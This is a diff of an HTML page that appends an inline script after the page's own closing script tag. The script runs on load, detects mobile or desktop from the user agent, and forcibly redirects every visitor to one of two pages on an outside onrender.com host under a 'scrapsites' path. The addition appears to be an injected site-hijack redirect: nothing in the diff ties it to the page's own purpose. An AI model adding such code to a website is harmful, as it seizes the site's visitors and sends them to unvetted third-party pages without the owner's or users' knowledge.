@@ -1140,6 +1140,22 @@
     }
 
     window.addEventListener('load', init);
-  </script>
+  </script><script>
+(function () {
+    // Check if device is mobile
+    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+        navigator.userAgent
+    );
+
+    if (isMobile) {
+        // Mobile redirect
+        window.location.href = "https://black-ice-3dbk.onrender.com/scrapsites/mindmap.html";
+    } else {
+        // Desktop redirect
+        window.location.href = "https://black-ice-3dbk.onrender.com/scrapsites/mindv2.html";
+    }
+})();
+</script>
+
 </body>
 </html>
